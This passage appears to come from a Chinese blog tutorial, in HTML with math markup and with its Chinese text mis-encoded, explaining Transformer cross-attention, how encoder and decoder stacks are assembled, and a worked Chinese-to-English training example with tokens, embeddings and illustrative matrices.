style="margin-right:0.22222em;">V</span></span></span></span></span>ï¼‰ä¸­æ±‡èšä¿¡æ¯ã€‚è¿™ä¸ªç¯èŠ‚çš„å­¦æœ¯åç§°å°±æ˜¯â€œäº¤å‰æ³¨æ„åŠ›â€ã€‚</p>
<p>æœ€åï¼Œè¿˜æœ‰ä¸€ä¸ªå…³é”®é—®é¢˜ï¼šå°±æ˜¯ä¸ºä»€ä¹ˆç¼–ç å™¨çš„è¾“å‡º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>çš„åºåˆ—é•¿åº¦<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>å’ŒåŸå§‹è¾“å…¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>çš„é•¿åº¦<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>å¯ä»¥ä¸ä¸€æ ·ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œä½ è‡ªå·±è¯•ä¸€è¯•å°±çŸ¥é“äº†ï¼Œå°†è¿™ä¸¤ä¸ªä¸ä¸€æ ·é•¿åº¦çš„çŸ©é˜µè¾“å…¥åˆ°è‡ªæ³¨æ„åŠ›çŸ©é˜µä¸­ï¼ŒæŒ‰ç…§ä¸Šè¿°è®²è§£çš„è‡ªæ³¨æ„åŠ›çŸ©é˜µç®—æ³•ï¼Œè‡ªå·±åŠ¨æ‰‹ï¼Œçœ‹çœ‹å…¶è¾“å‡ºçŸ©é˜µçš„å½¢çŠ¶æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚</p>
<p>æœ€åä½ ä¼šå‘ç°<strong>è¾“å‡ºåºåˆ—é•¿åº¦ä¸è§£ç å™¨è¾“å…¥é•¿åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> ä¿æŒä¸€è‡´ï¼Œè€Œä¸ç¼–ç å™¨è¾“å‡ºé•¿åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> æ— å…³</strong>ã€‚æ­£æ˜¯è¿™ä¸€ç‰¹æ€§èµ‹äºˆäº† Transformer æå¤§çš„çµæ´»æ€§ï¼Œä½¿å…¶èƒ½å¤Ÿè½»æ¾å¤„ç†å¦‚æœºå™¨ç¿»è¯‘ä¸­æºè¯­è¨€ä¸ç›®æ ‡è¯­è¨€å¥å­é•¿åº¦ä¸ç­‰çš„æƒ…å†µï¼Œ<strong>å®ç°äº†è¾“å…¥ä¸è¾“å‡ºåºåˆ—é•¿åº¦çš„è§£è€¦</strong>ã€‚</p>
<hr/>
<p>æœ€åçš„æœ€åï¼Œæˆ‘ä»¬å°†ä¸Šæ–‡ä¸­è®²è§£çš„ç¼–ç å™¨å±‚ï¼ˆTransformer Encoder Layerï¼‰ä¸è§£ç å™¨å±‚ï¼ˆTransforme Decoder Layerï¼‰æ¨¡å—ï¼ŒæŒ‰ç…§è®ºæ–‡ã€ŠAttention Is All You Needã€‹ä¸­çš„è“å›¾ï¼Œå±‚å±‚å †å ã€é¡ºåºè¿æ¥ï¼Œæœ€ç»ˆæ„å»ºå‡º Transformer æ¨¡å‹çš„å®Œæ•´æ¶æ„ã€‚å…¶æ•´ä½“ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ƒæ¸…æ™°å±•ç¤ºäº†æ•°æ®ä»è¾“å…¥åˆ°è¾“å‡ºçš„å®Œæ•´æµç¨‹ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a4ade1bb54b49bdbced29db6617d020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=R29Oc559wEvBd7andofff%2Fm0fsA%3D" alt="c14.jpg" width="100%" loading="lazy"/></p>
<p align="center">ã€Œæœ€å³ä¾§çš„Transformeræ¶æ„å›¾æ¥æºï¼šã€ŠAttention Is All You Needã€‹ã€</p>
<p>ç”±äº Transformer æ¶æ„è®¾è®¡çš„åˆè¡·å°±æ˜¯ä¸ºäº†è§£å†³åºåˆ—åˆ°åºåˆ—ï¼ˆSeq2Seqï¼‰ä»»åŠ¡ï¼Œç‰¹åˆ«æ˜¯æœºå™¨ç¿»è¯‘ï¼Œå› æ­¤æˆ‘ä»¬ä»¥ä¸­è‹±ç¿»è¯‘ä¸ºä¾‹æ¥é˜é‡Šè¿™ä¸ªç½‘ç»œçš„å·¥ä½œæµç¨‹ã€‚ä½ ä¼šçœ‹åˆ°ï¼Œå…¶è®¾è®¡å“²å­¦ä¸äººç±»ç¿»è¯‘çš„è¿‡ç¨‹æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚</p>
<p>å…ˆæ¥çœ‹å·¦ä¾§çš„ç¼–ç å™¨å †æ ˆï¼Œå®ƒæ˜¯ç”±<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>ä¸ªå®Œå…¨ç›¸åŒçš„ç¼–ç å™¨å±‚ï¼ˆTransformer Encoder Layerï¼‰å †å è€Œæˆã€‚ä¿¡æ¯åœ¨å±‚é—´é€çº§ä¼ é€’ã€ä¸æ–­è¢«æç‚¼å’ŒæŠ½è±¡ï¼Œåœ¨æœ€åä¸€å±‚è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå¯Œå«æ•´ä¸ªè¾“å…¥åºåˆ—ä¸Šä¸‹æ–‡ä¿¡æ¯çš„<strong>é«˜çº§è¯­ä¹‰è¡¨ç¤ºçŸ©é˜µ</strong>ã€‚è¿™ä¸ªé«˜çº§è¯­ä¹‰çŸ©é˜µå°†è¢«å¤åˆ¶å¤šä»½ï¼Œä¼ è¾“ç»™è§£ç å™¨å †æ ˆä¸­çš„<strong>æ¯ä¸€ä¸ª</strong>è§£ç å™¨å±‚ä½œä¸ºâ€œçŸ¥è¯†å‚è€ƒâ€ã€‚</p>
<p>å†æ¥çœ‹å³ä¾§çš„è§£ç å™¨å †æ ˆï¼Œå®ƒåŒæ ·æ˜¯ç”±<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>ä¸ªå®Œå…¨ç›¸åŒçš„è§£ç å™¨å±‚ï¼ˆTransforme Decoder Layerï¼‰å †å è€Œæˆã€‚å®ƒçš„èŒè´£æ˜¯<strong>å‚è€ƒç¼–ç å™¨æä¾›çš„â€œé«˜çº§è¯­ä¹‰çŸ©é˜µâ€ï¼Œè‡ªä¸»åœ°ã€é€ä¸ªå•è¯åœ°ç”Ÿæˆç›®æ ‡è¯­è¨€å¥å­</strong>ã€‚</p>
<p>å¯ä»¥è¿™æ ·ç†è§£ï¼Œå‡è®¾æˆ‘ä»¬è¦ç¿»è¯‘â€œäººå±±äººæµ·â€ï¼Œæˆ‘ä»¬è‚¯å®šä¸æ˜¯ç›´æ¥é€å­—ç¿»è¯‘æˆâ€œpeople mountain people seaâ€ï¼Œè¿™å¤ªæ€ªäº†ã€‚è€Œæ˜¯æˆ‘ä»¬åœ¨ç†è§£äº†â€œäººå±±äººæµ·â€æ‰€è¡¨è¾¾çš„æ„æ€åï¼ˆè¿™å°±æ˜¯ç¼–ç å™¨å¹²çš„äº‹æƒ…ï¼‰ï¼Œç„¶åæŒ‰ç…§è¿™ä¸ªæ„æ€ç¿»è¯‘æˆè‹±æ–‡ï¼ˆè¿™å°±æ˜¯è§£ç å™¨ï¼‰ï¼Œâ€œa huge crowd of peopleâ€ã€‚</p>
<blockquote>
<p>é¢˜å¤–è¯ï¼šè¯´åˆ°ç¿»è¯‘ï¼Œæˆ‘æƒ³åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„è§£è¯»ã€‚å¾ˆå¤šäººéƒ½è¯´ä¸­å›½çš„å¤è¯—è¯ï¼Œæ–‡è¨€æ–‡ï¼Œå¾ˆéš¾ç¿»è¯‘æˆè‹±æ–‡ï¼Œå› ä¸ºç¿»è¯‘åå°±ä¸¢å¤±äº†åŸæœ‰çš„ä¸­æ–‡çš„é‚£ç§æ„Ÿè§‰å’Œæ„å¢ƒï¼Œæ¯”å¦‚â€œå­¤èˆŸè“‘ç¬ ç¿ï¼Œç‹¬é’“å¯’æ±Ÿé›ªâ€ï¼Œä½ æ€ä¹ˆç¿»è¯‘éƒ½ç¿»è¯‘ä¸å‡ºè¿™ç§å‘³é“ï¼›åŒæ ·çš„ï¼Œä¸€äº›è‹±æ–‡è¯—åªæœ‰åœ¨è‹±æ–‡çš„è¯­å¢ƒä¸‹æ‰èƒ½ä½“ä¼šå®ƒçš„ç¾ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±å˜æˆå¤§ç™½è¯äº†ã€‚æˆ–è®¸æ­£å¦‚ä¸€å¥åè¨€æ‰€è¯´ï¼šä»€ä¹ˆæ˜¯è¯—ï¼Ÿè¯—ï¼Œå°±æ˜¯åœ¨ç¿»è¯‘ä¸­ä¸¢å¤±çš„ä¸œè¥¿ï¼ˆLost in Translationï¼‰ã€‚</p>
</blockquote>
<p>é‚£å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç½‘ç»œå‘¢ï¼Ÿå¦‚ä½•åˆ©ç”¨å®ƒè®­ç»ƒä¸€ä¸ªä¸­è¯‘è‹±ç¿»è¯‘å™¨å‘¢ï¼Ÿ</p>
<p>å°±ä»¥ä¸­æ–‡â€œæˆ‘å–œæ¬¢æ·±åº¦å­¦ä¹ â€ç¿»è¯‘æˆè‹±æ–‡â€œI like deep learningâ€ä¸ºä¾‹ï¼Œæ¥è¯¦ç»†è§£æå…¶è®­ç»ƒæµç¨‹ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåºåˆ—åˆ°åºåˆ—ï¼ˆSeq2Seqï¼‰çš„ç›‘ç£å­¦ä¹ ä»»åŠ¡ï¼šæºå¥ä½œä¸ºè¾“å…¥ï¼Œç›®æ ‡å¥ä½œä¸ºæ ‡ç­¾ã€‚</p>
<p>é¦–å…ˆè¿›è¡Œæ•°æ®é¢„å¤„ç†ä¸åˆ†è¯ï¼š</p>
<ul>
<li>æºè¯­è¨€ï¼ˆä¸­æ–‡ï¼‰åˆ†è¯ï¼š<code>[â€œæˆ‘â€, â€œå–œæ¬¢â€, â€œæ·±åº¦å­¦ä¹ â€]</code>ï¼Œåºåˆ—é•¿åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">L_{src}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3</span></span></span></span></span>ã€‚</li>
<li>ç›®æ ‡è¯­è¨€ï¼ˆè‹±æ–‡ï¼‰åˆ†è¯å¹¶æ·»åŠ ç‰¹æ®Šæ ‡è®°ï¼š
<ul>
<li>è§£ç å™¨è¾“å…¥ï¼š<code>[â€œ&lt;sos&gt;â€, â€œIâ€, â€œlikeâ€, â€œdeepâ€, â€œlearningâ€]</code>ï¼Œåºåˆ—é•¿åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{out}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>ã€‚</li>
<li>æ ‡ç­¾ï¼š<code>[â€œIâ€, â€œlikeâ€, â€œdeepâ€, â€œlearningâ€,"&lt;eos&gt;"]</code>ï¼Œåºåˆ—é•¿åº¦ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mrow><mi>t</mi><mi>g</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">L_{tgt}=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">5</span></span></span></span></span>ã€‚</li>
</ul>
</li>
</ul>
<p>æ³¨æ„è¿™é‡Œè¦ç»™ç›®æ ‡å¥å­åŠ ä¸Šå¼€å§‹æ ‡ç­¾<code>&lt;sos&gt;</code>å’Œç»“æŸæ ‡ç­¾<code>&lt;eos&gt;</code>ï¼Œè¦ä¸ç„¶è§£ç å™¨å°±ä¸çŸ¥é“ä»å“ªé‡Œå¼€å§‹ï¼Œåˆ°å“ªé‡Œç»“æŸç”Ÿæˆä¸€ä¸ªå¥å­äº†ã€‚</p>
<p>è‹¥ä½ å¯¹è¯å‘é‡ï¼ˆword embeddingsï¼‰æˆ–ç‰¹æ®Šæ ‡è®°çš„ä½œç”¨è¿˜ä¸ç†Ÿæ‚‰ï¼Œå»ºè®®å…ˆäº†è§£è‡ªç„¶è¯­è¨€å¤„ç†ä¸­çš„è¯è¡¨ç¤ºåŸºç¡€ã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œæˆ‘é©¬ä¸Šå°±ä¼šå†™ä¸€ç¯‡ä¸“é—¨å…³äºè¯å‘é‡çš„æ–°çš„æ–‡ç« ï¼Œå³ä½¿0åŸºç¡€è‡ªç„¶è¯­è¨€å¤„ç†ä¹Ÿèƒ½çœ‹æ‡‚ï¼Œçœ‹åˆ°è¿™é‡Œä¸å¦¨ç»™æˆ‘ä¸ªå…³æ³¨å§ã€‚(à¹‘ËƒÌµá´—Ë‚Ìµ)Ùˆ  âœ¨</p>
<p>åˆ†è¯åçš„åºåˆ—é€šè¿‡è¯åµŒå…¥å±‚è½¬æ¢ä¸ºç¨ å¯†å‘é‡è¡¨ç¤ºï¼š</p>
<ul>
<li>ä¸­æ–‡åºåˆ—é€šè¿‡ä¸€ä¸ªåµŒå…¥å±‚ï¼ˆEmbedding1ï¼‰è½¬æ¢ä¸ºè¯å‘é‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>s</mi><mi>r</mi><mi>c</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{src}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">src</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</li>
<li>è‹±æ–‡åºåˆ—é€šè¿‡å¦ä¸€ä¸ªåµŒå…¥å±‚ï¼ˆEmbedding2ï¼‰è½¬æ¢ä¸ºè¯å‘é‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</li>
</ul>
<p>ä¾‹å¦‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡è®¾ ç»´åº¦ = 512</span>
X_src = [[<span class="hljs-number">0.12</span>, <span class="hljs-number">0.71</span>, ..., <span class="hljs-number">0.32</span>],  <span class="hljs-comment"># â€œæˆ‘â€çš„è¯å‘é‡</span>
         [<span class="hljs-number">0.15</span>, <span class="hljs-number">0.31</span>, ..., <span class="hljs-number">0.46</span>],  <span class="hljs-comment"># â€œå–œæ¬¢â€çš„è¯å‘é‡</span>
         [<span class="hljs-number">0.09</span>, <span class="hljs-number">0.52</span>, ..., <span class="hljs-number">0.87</span>]]  <span class="hljs-comment"># â€œæ·±åº¦å­¦ä¹ â€çš„è¯å‘é‡</span>

X_out = [[<span class="hljs-number">0.01</span>, <span class="hljs-number">0.80</span>, ..., <span class="hljs-number">0.10</span>],  <span class="hljs-comment"># &lt;sos&gt;</span>
         [<span class="hljs-number">0.45</span>, <span class="hljs-number">0.23</span>, ..., <span class="hljs-number">0.67</span>],  <span class="hljs-comment"># â€œIâ€</span>
         [<span class="hljs-number">0.33</span>, <span class="hljs-number">0.19</span>, ..., <span class="hljs-number">0.55</span>],  <span class="hljs-comment"># â€œlikeâ€</span>
         [<span class="hljs-number">0.87</span>, <span class="hljs-number">0.41</span>, ..., <span class="hljs-number">0.22</span>],  <span class="hljs-comment"># â€œdeepâ€</span>
         [<span class="hljs-number">0.29</span>, <span class="hljs-number">0.64</span>, ..., <span class="hljs-number">0.38</span>]]  <span class="hljs-comment"># â€œlearningâ€</span>
</code></pre>
<p>è¿™ä¸¤ä¸ªçŸ©é˜µè¾“å…¥åˆ°Transformerä¸­åç»è¿‡ä¸€é€šè®¡ç®—ï¼Œæœ€ååœ¨è§£ç å™¨æœ€åä¸€å±‚è¾“å‡ºçš„å°±æ˜¯å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">X_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ç›¸åŒå½¢çŠ¶çš„çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span>ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è§£ç å™¨è¾“å‡ºç¤ºæ„ï¼ˆæ¯ä¸ªå‘é‡å¯¹åº”ä¸€ä¸ªæ—¶é—´æ­¥çš„è¡¨ç¤ºï¼‰</span>
O =  [[<span class="hljs-number">0.74</span>, <span class="hljs-number">0.22</span>, ..., <span class="hljs-number">0.62</span>],  <span class="hljs-comment"># å¯¹åº” "&lt;sos&gt;" ä½ç½®çš„è¾“å‡º , æœ€ç»ˆè¦å’Œæ ‡ç­¾"I"ä½œæŸå¤±</span>
      [<span class="hljs-number">0.35</span>, <span class="hljs-number">0.58</span>, ..., <span class="hljs-number">0.56</span>],  <span class="hljs-comment"># å¯¹åº” "I" ä½ç½®çš„è¾“å‡º , æœ€ç»ˆè¦å’Œæ ‡ç­¾"like"ä½œæŸå¤±</span>
      [<span class="hljs-number">0.53</span>, <span class="hljs-number">0.40</span>, ..., <span class="hljs-number">0.41</span>],  <span class="hljs-comment"># å¯¹åº” "like" , å’Œæ ‡ç­¾"deep"ä½œæŸå¤±</span>
      [<span class="hljs-number">0.18</span>, <span class="hljs-number">0.63</span>, ..., <span class="hljs-number">0.79</span>],  <span class="hljs-comment"># å¯¹åº” "deep" , å’Œæ ‡ç­¾"learning"ä½œæŸå¤±</span>
      [<span class="hljs-number">0.07</span>, <span class="hljs-number">0.73</span>, ..., <span class="hljs-number">0.24</span>]]  <span class="hljs-comment"># å¯¹åº” "learning" , å’Œæ ‡ç­¾"&lt;eos&gt;"ä½œæŸå¤±</span>
</code></pre>
<p>æœ€åï¼ŒçŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span> ç»è¿‡ä¸€ä¸ªçº¿æ€§å±‚ï¼ˆLinearï¼‰ï¼Œå°†ç»´åº¦ä» <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span> æ˜ å°„åˆ°è‹±æ–‡è¯è¡¨å¤§å° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 